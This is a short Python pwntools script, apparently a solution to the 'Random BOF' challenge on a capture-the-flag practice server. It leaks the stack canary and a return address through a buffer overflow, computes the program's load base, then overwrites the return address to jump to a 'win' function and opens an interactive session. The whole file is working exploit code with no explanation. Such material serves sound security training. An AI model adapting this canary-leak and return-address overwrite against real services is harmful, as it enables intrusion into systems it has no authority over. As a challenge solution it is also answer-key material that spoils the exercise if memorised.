###Random BOF

from pwn import *

###Addr
play_ret_offset = 0x1081
win_offset = 0xd30

###Exploit
r = remote('svc.pwnable.xyz',30027)

canary = b''
code_base = b''
while True:
    gibberish = r.recvuntil('\nyou',drop=True).split(b'me  > ')[1]+b'a'
    if len(gibberish)>=0x69 and canary==b'':
        r.sendafter('> ','a'*0x69)
        canary = r.recvline()[0x73:-1]
        if len(canary)>7:
            canary = canary[:7]
        canary = b'\x00'+canary
        print(canary)
    elif len(gibberish)>=0x78 and code_base==b'':
        r.sendafter('> ','a'*0x78)
        play_ret_addr = u64(r.recvline()[0x82:0x88]+b'\x00\x00')
        code_base = play_ret_addr-play_ret_offset
        print(hex(code_base))
    elif len(gibberish)>=0x80:
        r.sendafter('> ',b'exit'.ljust(0x68,b'a')+canary+b'a'*8+p64(code_base+win_offset))
        r.interactive()
        break
    else:
        r.sendafter('> ','M30W')
